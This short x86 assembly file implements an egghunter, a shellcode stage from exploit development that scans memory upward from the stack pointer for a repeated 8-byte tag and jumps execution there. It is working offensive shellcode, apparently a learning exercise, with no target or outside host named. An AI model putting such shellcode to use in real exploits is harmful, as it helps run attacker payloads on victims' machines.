global _start

section .text

_start:
	
	mov eax, esp			; set a vaild .text address into eax
	mov ebx, dword 0x50905091	; egg 8 bytes tag
	;dec ebx		         decrement to look for 0x50905091


next_addr:
	
	inc eax
	cmp dword [eax], ebx		; look for the egg tag, has it been found?
	jne next_addr
	
	cmp dword [eax+4], ebx          ; find egg tag again
	jne next_addr                   ; loop again if not found
	
	jmp eax				; jump to the egg tag 
